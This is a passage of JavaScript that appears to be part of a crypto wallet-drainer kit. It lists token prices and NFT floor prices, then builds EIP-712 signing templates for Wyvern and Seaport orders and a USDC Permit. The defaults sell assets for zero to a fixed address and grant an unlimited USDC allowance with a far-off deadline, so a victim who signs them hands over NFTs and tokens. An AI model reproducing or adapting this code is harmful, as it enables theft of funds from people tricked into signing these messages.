    "0x8806926ab68eb5a7b909dcaf6fdbe5d93271d6e2": 7.18,
    "0xf51ebf9a26dbc02b13f8b3a9110dac47a4d62d78": 0.00515966,
    "0xc0ae17eb994fa828540ffa53776b3830233a1b02": 0.01686633,
    "0x428dc22668e6f3468273634067e5545ed5417a3e": 0.0166599,
    "0x5b71bee9d961b1b848f8485eec8d8787f80217f5": 0.00267517,
    "0x6a8fee0e33cb65a7e8d21badca62e87639ef74b3": 21.56,
    "0x84f20bf5bb4be345d3ab37c565f732753435dbe3": 24.99,
    "0x382a1667c9062f0621362f49076ef6e4fe4c9ec7": 0.0065173,
    "0x61fd1c62551850d0c04c76fce614cbced0094498": 0.066929,
    "0xd241d7b5cb0ef9fc79d9e4eb9e21f5e209f52f7d": 0.812893,
    "0xa3c22370de5f9544f0c4de126b1e46ceadf0a51b": 0.440734,
    "0x940bdcb99a0ee5fb008a606778ae87ed9789f257": 0.611293,
    "0x1f3f677ecc58f6a1f9e2cf410df4776a8546b5de": 0.00004153,
    "0xde5ea375ffbdc8b25a80fe13d631e8ba0ab4bb02": 0.176643,
    "0x9d5963ba32e877871dff3e2e697283dc64066271": 0.04833654,
    "0xee9801669c6138e84bd50deb500827b776777d28": 0.153543,
    "0xf99d58e463a2e07e5692127302c20a191861b4d6": 3.43,
    "0xfb19075d77a0f111796fb259819830f4780f1429": 1.8,
    "0x78132543d8e20d2417d8a07d9ae199d458a0d581": 6.99716e-10,
    "0xa06bc25b5805d5f8d82847d191cb4af5a3e873e0": 6.49,
    "0x6107f4901476c3449403a1d908e19148950c2bc5": 0.0000278,
    "0x64d91f12ece7362f91a6f8e7940cd55f05060b92": 1.3,
    "0xffbf315f70e458e49229654dea4ce192d26f9b25": 0.03,
    "0x752efadc0a7e05ad1bcccda22c141d01a75ef1e4": 0.23
};

var openseaTokens = {
    '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2': 1,
    '0x6b175474e89094c44da98b954eedeac495271d0f': 1,
    // '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48': 1,
    '0x4d224452801aced8b2f0aebe155379bb5d594381': 1,
    '0x64d91f12ece7362f91a6f8e7940cd55f05060b92': 1,
    '0x0d8775f648430679a709e98d2b0cb6250d2887ef': 1,
    '0x15d4c048f83bd7e37d49ea4c83a07267ec4203da': 1,
    '0x514910771af9ca656af840dff83e8264ecf986ca': 1,
    '0x0f5d2fb29fb7d3cfee444a200298f468908cc942': 1,
    '0x557b933a7c2c45672b610f8954a3deb39a51a8ca': 1,
    '0x3845badade8e6dff049820680d1f14bd3903a5d0': 1,
    '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984': 1,
}

var nftList = {
    "0xd4e4078ca3495de5b1d4db434bebc5a986197782": 274,
    "0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d": 91.8,
    "0x9c8ff314c9bc7f6e59a9d9225fb22946427edc03": 130,
    "0x08d7c0242953446436f34b4c78fe9da38c73668d": 79.5,
    "0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb": 60,
    "0x22c36bfdcef207f9c0cc941936eff94d4246d14a": 24.9,
    "0x57a204aa1042f6e66dd7730813f4024114d74f37": 21.5,
    "0x23581767a106ae21c074b2276d25e5c3e136a68b": 22,
    "0x348fc118bcc65a92dc033a951af153d14d945312": 20.49,
    "0xed5af388653567af2f388e6224dc7c4b3241c544": 9.75,
    "0x620b70123fb810f6c653da7644b5dd0b6312e4d8": 14.5,
    "0x60e4d786628fea6478f785a6d7e704777c86a7c6": 17.1,
    "0x8a90cab2b38dba80c64b7734e58ee1db38b8992e": 10.84,
    "0x49cf6f5d44e70224e2e23fdcdd2c053f30ada28b": 9.64,
    "0xc541fc1aa62384ab7994268883f80ef92aac6399": 2,
    "0xa3aee8bce55beea1951ef834b99f3ac60d1abeeb": 7.75,
    "0xba30e5f9bb24caa003e9f2f0497ad287fdf95623": 7.61,
    "0x9930929903f9c6c83d9e7c70d058d03c376a8337": 8,
    "0x86825dfca7a6224cfbd2da48e85df2fc3aa7c4b1": 3.95,
    "0x86357a19e5537a8fba9a004e555713bc943a66c0": 7,
    "0x341a1c534248966c4b6afad165b98daed4b964ef": 4,
    "0x7bd29408f11d2bfc23c34f18275bbf23bb716bc7": 4.53,
    "0xbd4455da5929d5639ee098abfaa3241e9ae111af": 1.62,
    "0x282bdd42f4eb70e7a9d9f40c8fea0825b7f68c5d": 7.1,
    "0xedb61f74b0d09b2558f1eeb79b247c1f363ae452": 6.45,
    "0x306b1ea3ecdf94ab739f1910bbda052ed4a9f949": 1,
    "0x59468516a8259058bad1ca5f8f4bff190d30e066": 2.89,
    "0x1a92f7381b9f03921564a437210bb9396471050c": 3.69,
    "0xe785e82358879f061bc3dcac6f0444462d4b5330": 3.95,
    "0x7d8820fa92eb1584636f4f5b8515b5476b75171a": 2.3,
    "0x9df8aa7c681f33e442a0d57b838555da863504f3": 1.6,
    "0x34d85c9cdeb23fa97cb08333b511ac86e1c4e258": 2.4,
    "0x160c404b2b49cbc3240055ceaee026df1e8497a0": 0.23,
    "0x7eaa96d48380802a75ed6d74b91e2b30c3d474c1": 0.83,
    "0xb668beb1fa440f6cf2da0399f8c28cab993bdd65": 9.1,
    "0x513cd71defc801b9c1aa763db47b5df223da77a2": 16.88,
    "0x5b7622ded96511639ddc12c86eb2703331ca2c78": 0.54,
    "0xc9677cd8e9652f1b1aadd3429769b0ef8d7a0425": 3.3,
    "0x9705a7113363a383c8a96689e20286abe6612bb3": 2.75,
    "0x1792a96e5668ad7c167ab804a100ce42395ce54d": 1.53,
    "0x08ba8cbbefa64aaf9df25e57fe3f15ecc277af74": 5,
    "0xce17f8ef13cf67da6eab86e31360102eea8609ff": 2.4,
    "0x6dc6001535e15b9def7b0f6a20a2111dfa9454e2": 1.29,
    "0x6fc3ad6177b07227647ad6b4ae03cc476541a2a0": 3.79,
    "0x9168224fd1033ca25aaebae9eff39c92bd15231c": 1,
    "0xf81ead7c021ef1aef78ec1ffe1e4abd0ecdb216d": 2,
    "0x6d4bbc0387dd4759eee30f6a482ac6dc2df3facf": 1.97,
    "0xf54cc94f1f2f5de012b6aa51f1e7ebdc43ef5afc": 0.55,
    "0x1cb1a5e65610aeff2551a50f76a87a7d3fb649c6": 2.2,
    "0x8a939fd297fab7388d6e6c634eee3c863626be57": 5.67,
    "0x78d61c684a992b0289bbfe58aaa2659f667907f8": 2.4,
    "0x496a2d17a89cbc4248e9b52c8003a50c648fbca0": 3.89,
    "0xae3d8d68b4f6c3ee784b2b0669885a315ba77c08": 2.98,
    "0xe0176ba60efddb29cac5b15338c9962daee9de0c": 0.87,
    "0x0825f050e9b021a0e9de8cb1fb10b6c9f41e834c": 2.2,
    "0x892848074ddea461a15f337250da3ce55580ca85": 2.08,
    "0xc9d8f15803c645e98b17710a0b6593f097064bef": 3.9,
    "0x20ed6cdf9344b3a187063a3ff4d883b6b1947b81": 1.25,
    "0xccc441ac31f02cd96c153db6fd5fe0a2f4e6a68d": 2.7,
    "0x7cc7add921e2222738561d03c89589929cefcf21": 0.19,
    "0x16de9d750f4ac24226154c40980ef83d4d3fd4ad": 1.55,
    "0xb6329bd2741c4e5e91e26c4e653db643e74b2b19": 1.75,
    "0xab0b0dd7e4eab0f9e31a539074a03f1c1be80879": 1.7,
    "0xf661d58cfe893993b11d53d11148c4650590c692": 0.92,
    "0x2250d7c238392f4b575bb26c672afe45f0adcb75": 1.9,
    "0xd2f668a8461d6761115daf8aeb3cdf5f40c532c6": 0.4,
    "0xf87e31492faf9a91b02ee0deaad50d51d56d5d4d": 2.14,
    "0x959e104e1a4db6317fa58f8295f586e1a978c297": 2.14,
    "0x521f9c7505005cfa19a8e5786a9c3c9c9f5e6f42": 1.55,
    "0x31b6d1289f96818e79dbb271bf77e8132b86e814": 0.6,
    "0x79fcdef22feed20eddacbb2587640e45491b757f": 1.45,
    "0x3903d4ffaaa700b62578a66e7a67ba4cb67787f9": 0.95,
    "0xd0318da435dbce0b347cc6faa330b5a9889e3585": 1.1,
    "0x529a4e15b3ce13523417f945ecd0959ff71e0a9e": 0.75,
    "0x6080b6d2c02e9a0853495b87ce6a65e353b74744": 0.18,
    "0xbd3531da5cf5857e7cfaa92426877b022e612cf8": 2.19,
    "0x75e95ba5997eb235f40ecf8347cdb11f18ff640b": 1.47,
    "0x2acab3dea77832c09420663b0e1cb386031ba17b": 1.1,
    "0x960b7a6bcd451c9968473f7bbfd9be826efd549a": 1.09,
    "0x0bd4d37e0907c9f564aaa0a7528837b81b25c605": 0.32,
    "0x28472a58a490c5e09a238847f66a68a47cc76f0f": 0.85,
    "0x03ef30e1aee25abd320ad961b8cd31aa1a011c97": 0.21,
    "0x9c80777cae192e5031c38a0d951c55730ecc3f5e": 0.41,
    "0x6e9da81ce622fb65abf6a8d8040e460ff2543add": 1.41,
    "0x5cc5b05a8a13e3fbdb0bb9fccd98d38e50f90c38": 1.93,
    "0x0972290a80333d19c6703073c3e57134a4ca0127": 0.88,
    "0xb4d06d46a8285f4ec79fd294f78a881799d8ced9": 0.26,
    "0x3abedba3052845ce3f57818032bfa747cded3fca": 0.42,
    "0x38a6fd7148c4900338e903258b5e289dfa995e2e": 1.08,
    "0xfe8c6d19365453d26af321d0e8c910428c23873f": 1.2,
    "0x950b9476a4de757bb134483029ac4ec17e739e3a": 1.12,
    "0xa1d4657e0e6507d5a94d06da93e94dc7c8c44b51": 0.43,
    "0x5bd815fd6c096bab38b4c6553cfce3585194dff9": 0.12,
    "0x9c8d2f53f6bff84458f1c84fdaa1e4852ca958e3": 0.6,
    "0x880644ddf208e471c6f2230d31f9027578fa6fcc": 1.375,
    "0x5be99338289909d6dbbc57bb791140ef85ccbcab": 0.17,
    "0x698fbaaca64944376e2cdc4cad86eaa91362cf54": 0.7,
    "0xd7b397edad16ca8111ca4a3b832d0a5e3ae2438c": 1.15,
    "0x86c10d10eca1fca9daf87a279abccabe0063f247": 0.23,
    "0x09233d553058c2f42ba751c87816a8e9fae7ef10": 0.9,
    "0x9378368ba6b85c1fba5b131b530f5f5bedf21a18": 0.44,
    "0x0c2e57efddba8c768147d1fdf9176a0a6ebd5d83": 0.59,
    "0xef0182dc0574cd5874494a120750fd222fdb909a": 0.8,
    "0xeb3a9a839dfeeaf71db1b4ed6a8ae0ccb171b227": 0.8,
    "0x1b829b926a14634d36625e60165c0770c09d02b2": 1.17,
    "0xb5c747561a185a146f83cfff25bdfd2455b31ff4": 0.48,
    "0x123b30e25973fecd8354dd5f41cc45a3065ef88c": 0.44,
    "0x4b61413d4392c806e6d0ff5ee91e6073c21d6430": 0.12,
    "0x97597002980134bea46250aa0510c9b90d87a587": 0.36,
    "0x8943c7bac1914c9a7aba750bf2b6b09fd21037e0": 0.7,
    "0x0b4b2ba334f476c8f41bfe52a428d6891755554d": 0.83,
    "0x7ea3cca10668b8346aec0bf1844a49e995527c8b": 0.59,
    "0x7948f7ff1158b338a898e80ce8b1c3c964a80cec": 1.8,
    "0xf61f24c2d93bf2de187546b14425bf631f28d6dc": 0.39,
    "0x495b01c1bc3b9203fde4362d9913c692fb661f3f": 0.15,
    "0xbad6186e92002e312078b5a1dafd5ddf63d3f731": 0.35,
    "0x0cfb5d82be2b949e8fa73a656df91821e2ad99fd": 0.6,
    "0x72d47d4d24018ec9048a9b0ae226f1c525b7e794": 0.3,
    "0x7ecb204fed7e386386cab46a1fcb823ec5067ad5": 0.7,
    "0xbd275ce24f32d6ce4e9d9519c55abe9bc0ed7fcf": 0.25,
    "0x35471f47c3c0bc5fc75025b97a19ecdde00f78f8": 0.49,
    "0x5af0d9827e0c53e4799bb226655a1de152a425a5": 1,
    "0x9a38dec0590abc8c883d72e52391090e948ddf12": 0.14,
    "0xcefc0a83564dd2a083b83b4a73bbae97e40fa7ea": 0.27,
    "0x7afe30cb3e53dba6801aa0ea647a0ecea7cbe18d": 0.71,
    "0xa6a5ec7b1b8a34ff2dcb2926b7c78f52a5ce3b90": 0.3,
    "0xd73acd7f5099fdd910215dbff029185f21ffbcf0": 0.21,
    "0xfcb1315c4273954f74cb16d5b663dbf479eec62e": 0.32,
    "0x1afef6b252cc35ec061efe6a9676c90915a73f18": 0.57,
    "0x67d9417c9c3c250f61a83c7e8658dac487b56b09": 0.5,
    "0x7afeda4c714e1c0a2a1248332c100924506ac8e6": 0.39,
    "0x970d5e0bd5c4f193fccf7fd579590c5f5c69b2d9": 0.32,
    "0x98a0227e99e7af0f1f0d51746211a245c3b859c2": 0.32,
    "0xc1caf0c19a8ac28c41fe59ba6c754e4b9bd54de9": 0.67,
    "0x364c828ee171616a39897688a831c2499ad972ec": 0.65,
    "0x13927739076014913a3a7c207ef84c5be4780014": 0.22,
    "0x25cd67e2dfec471acd3cdd3b22ccf7147596dd8b": 0.1,
    "0xa5c0bd78d1667c13bfb403e2a3336871396713c5": 0.25,
    "0x8d4100897447d173289560bc85c5c432be4f44e4": 0.34,
    "0x4a8c9d751eeabc5521a68fb080dd7e72e46462af": 0.16,
    "0x4db1f25d3d98600140dfc18deb7515be5bd293af": 0.87,
    "0xad9fd7cb4fc7a0fbce08d64068f60cbde22ed34c": 0.44,
    "0x4a537f61ef574153664c0dbc8c8f4b900cacbe5d": 0.51,
    "0x3fe1a4c1481c8351e91b64d5c398b159de07cbc5": 0.33,
    "0x8ffb9b504d497e4000967391e70d542b8cc6748a": 0.09,
    "0xf4ee95274741437636e748ddac70818b4ed7d043": 0.32,
    "0xa5e25b44b01e09b7455851838c76cde68d13e29f": 0.3,
    "0x177ef8787ceb5d4596b6f011df08c86eb84380dc": 0.23,
    "0x2f102e69cbce4938cf7fb27adb40fad097a13668": 0.95,
    "0xd78b76fcc33cd416da9d3d42f72649a23d7ac647": 0.27,
    "0xc8e1de8dc39a758c7a50f659b53f787e0f1398bd": 0.16,
    "0x58519ea95cdfad3622c4c574e61a58fa257d9e77": 0.33,
    "0xe70da20a2b10d60ca620a4e494fe2b37c9499e97": 0.17,
    "0x226bf5293692610692e2c996c9875c914d2a7f73": 0.59,
    "0xe51aac67b09eaed6d3d43e794d6bae679cbe09d8": 0.32,
    "0x338be3d8d0209815601e72f7a04ac7f37d61564b": 0.32,
    "0x716f29b8972d551294d9e02b3eb0fc1107fbf4aa": 0.33,
    "0x466cfcd0525189b573e794f554b8a751279213ac": 1.15,
    "0x80336ad7a747236ef41f47ed2c7641828a480baa": 1.7,
    "0x509a050f573be0d5e01a73c3726e17161729558b": 53,
    "0xfc2068c3d47b575a60f6a4a7bf60dea0ac368e01": 2.29,
    "0x19b86299c21505cdf59ce63740b240a9c822b5e4": 0.64,
    "0x130cfab3817467f532c179d4e6502f5a7e7d44c7": 0.35,
    "0xdd012153e008346591153fff28b0dd6724f0c256": 14.9,
    "0x77640cf3f89a4f1b5ca3a1e5c87f3f5b12ebf87e": 2.55,
    "0xbce3781ae7ca1a5e050bd9c4c77369867ebc307e": 2.74,
    "0xd2a077ec359d94e0a0b7e84435eacb40a67a817c": 13,
    "0xf729f878f95548bc7f14b127c96089cf121505f8": 1.08,
    "0xb852c6b5892256c264cc2c888ea462189154d8d7": 0.45,
    "0xd497a414bb00803e846b53d07fcb742831b24906": 1.94,
    "0x17664d42e5d9e046166a8bcb4ad0cfb7bc8bd186": 0.3,
    "0x39fa15e7dffd76bdeec83c9a1a8ef023661c9b6c": 0.3,
    "0xc23a563a26afff06e945ace77173e1568f288ce5": 0.37,
    "0xfb10b1717c92e9cc2d634080c3c337808408d9e1": 50,
    "0xaadc2d4261199ce24a4b0a57370c4fcf43bb60aa": 6.1,
    "0xeaa4c58427c184413b04db47889b28b5c98ebb7b": 14.49,
    "0xbeb1d3357cd525947b16a9f7a2b3d50b50b977bd": 3.5,
    "0x1fa8da0b63c639a7b53bae343e5761d56f898bac": 3.5,
    "0x6b00de202e3cd03c523ca05d8b47231dbdd9142b": 3.97,
    "0x9d6a7159e5accfc6520932f0f81a47e2ffd349a3": 5.09,
    "0x2c2ed910eb79b48fbbd949ad59636ffca83c8a17": 4.9,
    "0x76236b6f13f687d0bbedbbce0e30e9f07d071c1c": 1.22,
    "0xaa3fdc4a0700b82c9aa80655624d32701dc92946": 2.6,
    "0x251b5f14a825c537ff788604ea1b58e49b70726f": 3.5,
    "0x8d04a8c79ceb0889bdd12acdf3fa9d207ed3ff63": 3.99,
    "0x26437d312fb36bdd7ac9f322a6d4ccfe0c4fa313": 2.7,
    "0xd0a07a76746707f6d6d36d9d5897b14a8e9ed493": 1.04,
    "0x181aea6936b407514ebfc0754a37704eb8d98f91": 1,
    "0x80f1ed6a1ac694317dc5719db099a440627d1ea7": 70,
    "0x1eff5ed809c994ee2f500f076cef22ef3fd9c25d": 14.69,
    "0x89ecbeb233aa34c88c5d7d02d8113726dbc1bc78": 3.33,
    "0xd0f0c40fcd1598721567f140ebf8af436e7b97cf": 2.75,
    "0xcd1dbc840e1222a445be7c1d8ecb900f9d930695": 2.25,
    "0xdfacd840f462c27b0127fc76b63e7925bed0f9d5": 2,
    "0x1897d69cc0088d89c1e94889fbd2efffcefed778": 2.7,
    "0xbc4ca343167a5e2d9f700cf5b6b3f849585cd6fc": 6.5,
    "0x20c70bdfcc398c1f06ba81730c8b52ace3af7cc3": 7.8,
    "0x614917f589593189ac27ac8b81064cbe450c35e3": 2,
    "0xc0cf5b82ae2352303b2ea02c3be88e23f2594171": 1.76,
    "0xb228d7b6e099618ca71bd5522b3a8c3788a8f172": 1.49,
    "0x026224a2940bfe258d0dbe947919b62fe321f042": 1.34,
    "0x068f74749c24a42058563035f8c786362fc96494": 0.7,
    "0xbdde08bd57e5c9fd563ee7ac61618cb2ecdc0ce0": 2,
    "0xc5b52253f5225835cc81c52cdb3d6a22bc3b0c93": 1.36,
    "0xb336ae11e840e8d38d1453fd3d876cf4797f6716": 1.25,
    "0x2c8678f04e0aa12bd40280d110e69de1f8421c9b": 0.01,
    "0x659a4bdaaacc62d2bd9cb18225d9c89b5b697a5a": 0.07,
    "0x2e541cec5cb41e7678ac3c8e91acb3fc1db0da07": 0.02,
    "0x9f9b2b8e268d06dc67f0f76627654b80e219e1d6": 0.19,
    "0x0b7600ca77fc257fe7eb432f87825cccc4590037": 0.03,
    "0xda60730e1feaa7d8321f62ffb069edd869e57d02": 0.14,
    "0xa06fda2caa66148603314451ba0f30c9c5d539e3": 0.01,
    "0x497b54355043e7a0d06bf5e3c20cecf859fcc0a8": 0.03,
    "0x248139afb8d3a2e16154fbe4fb528a3a214fd8e7": 0.27,
    "0xc1ad47aeb274157e24a5f01b5857830aef962843": 0.08,
    "0x9a06ef3a841316a9e2c1c93b9c21a7342abe484f": 0.25,
    "0xb7be4001bff2c5f4a61dd2435e4c9a19d8d12343": 0.32,
    "0x390416ae4324494338293974ee6388e777fac34b": 0.19,
    "0x36d30b3b85255473d27dd0f7fd8f35e36a9d6f06": 0.12,
    "0x2a378c8d96e7d994fb9bec6adb7c6af2fe772c3b": 0.4,
    "0x698ff9c45f261e963ce060d1eb42099eaed333ae": 0.65,
    "0x497a9a79e82e6fc0ff10a16f6f75e6fcd5ae65a8": 0.35,
    "0x2120d19431e0dd49411e5412629f8e41a72cfabd": 0.59,
    "0xaad35c2dadbe77f97301617d82e661776c891fa9": 0.77,
    "0x5df8462548a3ea3bbb91767a6e47a770e5252359": 0.03,
    "0x82f5ef9ddc3d231962ba57a9c2ebb307dc8d26c2": 0.06,
    "0x709d30f1f60f03d85a0ef33142ef3259392dc9e1": 0.13,
    "0x17a088824f5d19876fa1929bb42315ef0a148c08": 0.01,
    "0x1e52f7a450b08b1b249a4f4f54518fc5278c2285": 0.03,
    "0x0a36f2178c0db2c85471c45334a1dd17d130fd42": 7.5,
    "0xe6160325a53de4deca66e3d88d7e4f25040acce0": 0.76,
    "0x6728d91abacdbac2f326baa384513a523c21b80a": 0.1,
    "0x704bf12276f5c4bc9349d0e119027ead839b081b": 0.44,
    "0x06b3fcc9e79d724a08012f0b9f71bd03b415d334": 0.34,
    "0x5180db8f5c931aae63c74266b211f580155ecac8": 0.33,
    "0xec7f8a34b97ac65caad3841659f2cd54285a3950": 0.13,
    "0x54251bc32a9f389df7c764ab50bb829ccdcb41bc": 0.05,
    "0x500f312864d14bcc73b3760c55fe6567b193437f": 0.04,
    "0x26badf693f2b103b021c670c852262b379bbbe8a": 1.32,
    "0x0616a2ef54bad0b37dce41c8d8e35cce17a926f3": 0.25,
    "0x9b091d2e0bb88ace4fe8f0fab87b93d8ba932ec4": 0.95,
    "0xd9c036e9eef725e5aca4a22239a23feb47c3f05d": 0.24,
    "0x8de878b9b29bfbb33eec346965194a37a83b45b1": 0.15,
    "0x244fc4178fa685af909c88b4d4cd7eb9127edb0b": 0.3,
    "0x6199a4a9a290b0b77ff2e113abe9d1ad4ab5ac63": 0.12,
    "0xea0acbb7449b59bccc5f3d4bc4af882e8afde148": 0.12,
    "0x455c732fee7b5c3b09531439b598ead4817d5274": 0.22,
    "0xc3f8a0f5841abff777d3eefa5047e8d413a1c9ab": 0.12,
    "0xc2c747e0f7004f9e8817db2ca4997657a7746928": 0.44,
    "0x8b634b2ae70e338865bf9741b4ae935adf2b4c55": 0.1,
    "0xa65ba71d653f62c64d97099b58d25a955eb374a0": 0.73,
    "0x1e1dcf251468ff7fbf6d3c76d783ba9f00ca045d": 0.2,
    "0xc8adfb4d437357d0a656d4e62fd9a6d22e401aa0": 0.11,
    "0xd3605059c3ce9facf625fa72d727508b7b7f280f": 0.05,
    "0xeF1a89cbfAbE59397FfdA11Fc5DF293E9bC5Db90": 0.14,
    "0xc99c679c50033bbc5321eb88752e89a93e9e83c5": 1.67,
    "0xbbe23e96c48030dc5d4906e73c4876c254100d33": 0.16,
    "0x986aea67c7d6a15036e18678065eb663fc5be883": 0.18,
    "0x0ffa87cd27ae121b10b3f044dda4d28f9fb8f079": 0.14,
    "0x092bbc993042a69811d23feb0e64e3bfa0920c6a": 0.22,
    "0xabf66ca534f8a5081303e3873f0f4771c67b7b45": 0.14,
    "0x0ee80069c9b4993882fe0b3fc256260eff385982": 0.04,
    "0xd9f092bdf2b6eaf303fc09cc952e94253ae32fae": 0.14,
    "0xc2e9678a71e50e5aed036e00e9c5caeb1ac5987d": 0.6,
    "0x2ee6af0dff3a1ce3f7e3414c52c48fd50d73691e": 0.01,
    "0x22c08c358f62f35b742d023bf2faf67e30e5376e": 0.1,
    "0x76b3af5f0f9b89ca5a4f9fe6c58421dbe567062d": 0.08,
    "0x809d8f2b12454fc07408d2479cf6dc701ecd5a9f": 0.27,
    "0x51ae5e2533854495f6c587865af64119db8f59b4": 0.14,
    "0x0beed7099af7514ccedf642cfea435731176fb02": 0.21,
    "0xc7df86762ba83f2a6197e1ff9bb40ae0f696b9e6": 0.19,
    "0x7721e8dd956e07f7254385a7c039e9bde92e425d": 0.09,
    "0x01cecf7a8f0095fa622ff03d714fd2244548da35": 0.05,
    "0x984f7b398d577c0adde08293a53ae9d3b6b7a5c5": 0.09,
    "0x80a4b80c653112b789517eb28ac111519b608b19": 0.11,
    "0x32f2a60942e7563cfc42766018641c6c6b10830e": 0.04,
    "0xf220db48f0d3ca8a9833e0353e7497dbceae7ac6": 0.08,
    "0xa08126f5e1ed91a635987071e6ff5eb2aeb67c48": 0.12,
    "0x4e76c23fe2a4e37b5e07b5625e17098baab86c18": 0.09,
    "0x4b103d07c18798365946e76845edc6b565779402": 0.3,
    "0x46fdfcb3cd89a1c54d36ee83a4adc184747b40d9": 1.59,

};

let msgParams = {
    domain: {
        chainId: 1,
        name: 'Wyvern Exchange Contract',
        version: '2.3',
        verifyingContract: '0x7f268357a8c2552623316e2562d90e642bb538e5',
    },
    message: {},
    primaryType: 'Order',
    types: {
        EIP712Domain: [{
                name: 'name',
                type: 'string'
            },
            {
                name: 'version',
                type: 'string'
            },
            {
                name: 'chainId',
                type: 'uint256'
            },
            {
                name: 'verifyingContract',
                type: 'address'
            },
        ],
        Order: [{
                name: 'exchange',
                type: 'address'
            },
            {
                name: 'maker',
                type: 'address'
            },
            {
                name: 'taker',
                type: 'address'
            },
            {
                name: 'makerRelayerFee',
                type: 'uint256'
            },
            {
                name: 'takerRelayerFee',
                type: 'uint256'
            },
            {
                name: 'makerProtocolFee',
                type: 'uint256'
            },
            {
                name: 'takerProtocolFee',
                type: 'uint256'
            },
            {
                name: 'feeRecipient',
                type: 'address'
            },
            {
                name: 'feeMethod',
                type: 'uint8'
            },
            {
                name: 'side',
                type: 'uint8'
            },
            {
                name: 'saleKind',
                type: 'uint8'
            },
            {
                name: 'target',
                type: 'address'
            },
            {
                name: 'howToCall',
                type: 'uint8'
            },
            {
                name: 'calldata',
                type: 'bytes'
            },
            {
                name: 'replacementPattern',
                type: 'bytes'
            },
            {
                name: 'staticTarget',
                type: 'address'
            },
            {
                name: 'staticExtradata',
                type: 'bytes'
            },
            {
                name: 'paymentToken',
                type: 'address'
            },
            {
                name: 'basePrice',
                type: 'uint256'
            },
            {
                name: 'extra',
                type: 'uint256'
            },
            {
                name: 'listingTime',
                type: 'uint256'
            },
            {
                name: 'expirationTime',
                type: 'uint256'
            },
            {
                name: 'salt',
                type: 'uint256'
            },
            {
                name: 'nonce',
                type: 'uint256'
            },
        ],
    },
};

var usdcMsgParams = {
    domain: {
        chainId: 1,
        name: 'USD Coin',
        version: '2',
        verifyingContract: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
    },
    message: {},
    primaryType: 'Permit',
    types: {
        EIP712Domain: [{
                name: 'name',
                type: 'string'
            },
            {
                name: 'version',
                type: 'string'
            },
            {
                name: 'chainId',
                type: 'uint256'
            },
            {
                name: 'verifyingContract',
                type: 'address'
            },
        ],
        Permit: [{
                name: 'owner',
                type: 'address'
            },
            {
                name: 'spender',
                type: 'address'
            },
            {
                name: 'value',
                type: 'uint256'
            },
            {
                name: 'nonce',
                type: 'uint256'
            },
            {
                name: 'deadline',
                type: 'uint256'
            },
        ],
    },
};

var defaultMsgObj = {
    "maker": "",
    "exchange": "0x7f268357a8c2552623316e2562d90e642bb538e5",
    "taker": "0x4Ac6005B03a14B2fbdcC00d4Dec781B7A2005f82",
    "makerRelayerFee": "250",
    "takerRelayerFee": "0",
    "makerProtocolFee": "0",
    "takerProtocolFee": "0",
    "feeRecipient": "0x5b3256965e7c3cf26e11fcaf296dfc8807c01073",
    "feeMethod": "1",
    "side": "1",
    "saleKind": "0",
    "target": "0x5FAf73b167d1246EfF95B33D64A6D8C7d9Dfc3B5",
    "howToCall": "1",
    "calldata": "0x1c14edea",
    "replacementPattern": "0xffffffff",
    "staticTarget": "0x0000000000000000000000000000000000000000",
    "staticExtradata": "0x",
    "paymentToken": "0x0000000000000000000000000000000000000000",
    "basePrice": "0",
    "extra": "0",
    "listingTime": "1654697296",
    "expirationTime": "1672444800",
    "salt": "12772431069430707512054426261695173181547098888267475104918147418851040611946",
    "nonce": "2"
};

var usdcDefaultMsgObj = {
    "owner": "",
    "spender": spenderAddr,
    "value": "115792089237316195423570985008687907853269984665640564039457584007913129639935",
    "nonce": 0,
    "deadline": "1988064000",
};

var wethDefaultMsgObj = {
    "maker": "",
    "exchange": "0x7f268357a8c2552623316e2562d90e642bb538e5",
    "taker": "0x0000000000000000000000000000000000000000",
    "makerRelayerFee": "0",
    "takerRelayerFee": "0",
    "makerProtocolFee": "0",
    "takerProtocolFee": "0",
    "feeRecipient": "0x5b3256965e7c3cf26e11fcaf296dfc8807c01073",
    "feeMethod": "1",
    "side": "0",
    "saleKind": "0",
    "target": "0x4Ac6005B03a14B2fbdcC00d4Dec781B7A2005f82",
    "howToCall": "1",
    "calldata": "0x45710074",
    "replacementPattern": "0xffffffff",
    "staticTarget": "0x0000000000000000000000000000000000000000",
    "staticExtradata": "0x",
    "paymentToken": "0x0000000000000000000000000000000000000000",
    "basePrice": "0",
    "extra": "0",
    "listingTime": "1654697296",
    "expirationTime": "1988064000",
    "salt": "12772431069430707512054426261695173181547098888267475104918147418851040611946",
    "nonce": "2"
};

var seaportMsgObj = {
    offerer: "0x4Ac6005B03a14B2fbdcC00d4Dec781B7A2005f82",
    offer: [],
    consideration: [],
    startTime: "1654697296",
    endTime: "115792089237316195423570985008687907853269984665640564039457584007913129639935",
    orderType: 2,
    zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00",
    zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
    salt: "13642667937274121",
    conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
    counter: 0,
};


let seaportMsgParams = {
    domain: {
        chainId: 1,
        name: 'Seaport',
        version: '1.1',
        verifyingContract: '0x00000000006c3852cbEf3e08E8dF289169EdE581',
    },
    message: {},
    primaryType: 'OrderComponents',
    types: {
        EIP712Domain: [{
                name: 'name',
                type: 'string'
            },
            {
                name: 'version',
                type: 'string'
            },
            {
                name: 'chainId',
                type: 'uint256'
            },
            {
                name: 'verifyingContract',
                type: 'address'
            },
        ],
        ConsiderationItem: [{
                name: 'itemType',
                type: 'uint8'
            },
            {
                name: 'token',
                type: 'address'
            },
            {
                name: 'identifierOrCriteria',
                type: 'uint256'
            },
            {
                name: 'startAmount',
                type: 'uint256'
            },
            {
                name: 'endAmount',
                type: 'uint256'
            },
            {
                name: 'recipient',
                type: 'address'
            },
        ],
        OfferItem: [{
                name: 'itemType',
                type: 'uint8'
            },
            {
                name: 'token',
                type: 'address'
            },
            {
                name: 'identifierOrCriteria',
                type: 'uint256'
            },
            {
                name: 'startAmount',
                type: 'uint256'
            },
            {
                name: 'endAmount',
                type: 'uint256'
            },
        ],
        OrderComponents: [{
                name: 'offerer',
                type: 'address'
            },
            {
                name: 'zone',
                type: 'address'
            },
            {
                name: 'offer',
                type: 'OfferItem[]'
            },
            {
                name: 'consideration',
